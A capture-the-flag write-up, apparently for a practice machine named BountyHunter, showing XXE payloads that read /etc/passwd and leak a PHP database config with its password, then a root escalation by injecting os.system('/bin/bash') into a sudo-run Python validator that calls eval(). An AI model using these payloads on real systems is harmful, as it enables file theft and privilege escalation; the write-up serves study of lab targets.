## **BOUNTY HOUNTER**



![image-20210730010508342](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730010508342.png)

![image-20210730010535743](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730010535743.png)



Base64 decode

 ```
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 		<bugreport>
 		<title>test</title>
 		<cwe>test</cwe>
 		<cvss>test</cvss>
 		<reward6É•Ý…É�'Vw&W'C`
 ```

we have to URL decoded first and the base64 decode

**XXE payload**

Create a new **ENTITY** called xxe, **SYSTEM** is a keyword that let the XML parser know that the ENTITY type is **EXTERNAL**

````
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>Test</cwe>
		<cvss>123</cvss>
		<reward>1</reward>
		</bugreport>

````

Final PoC with URL and base64 encoded

```
data= PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPgo8IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4meHhlOzwvdGl0bGU%2BCgkJPGN3ZT5UZXN0PC9jd2U%2BCgkJPGN2c3M%2BMTIzPC9jdnNzPgoJCTxyZXdhcmQ%2BMTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

*Response:*

![image-20210727231428484](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210727231428484.png)

I tried to find the id_rsa of the user **developemt** to access the **/etc/shadow**, to access the db.conf/ing and the db.php but all was a dead end.

They to access the db.php was by filter base64

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
```

![image-20210730010636672](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730010636672.png)

We got a base64 string response

```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

*decoded* 

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

![image-20210730010919988](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730010919988.png)

**user flag** 

```
31e6b08adeb1a6bd9289541bbe2ffe3f
```

## PrivEsc

![image-20210730012727472](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730012727472.png)

![image-20210730013101639](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730013101639.png)



```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```

Invalid ticket (/opt/skytrain_inc/invalid_tickets)

```
# Skytrain Inc
## Ticket to Bridgeport
__ticket code:__
**18+71+8**
##Issued: 2021/06/21
#End Ticket

```

Final PoC for root

```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**18+71 + __import__('os').system('/bin/bash')
```

![image-20210730171259804](C:\Users\542\AppData\Roaming\Typora\typora-user-images\image-20210730171259804.png)

root flag 

```
8063331c64bab808a5f2513412641014
```



